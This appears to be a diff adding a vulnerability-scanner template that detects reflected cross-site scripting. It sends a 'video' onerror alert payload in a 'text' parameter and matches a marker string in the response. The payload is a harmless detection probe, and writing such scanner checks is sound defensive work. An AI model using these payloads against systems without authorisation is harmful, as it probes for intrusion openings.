@@ -1,0 +1,20 @@
+id: xss2-280
+name: 'Reflected XSS2 ctx-9 via text'
+severity: high
+type: active
+tags:
+  - xss
+  - injection
+  - client
+description: 'Unencoded reflection in text'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      text:
+        - '<video><source onerror=alert(nx2279)>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nx2279'
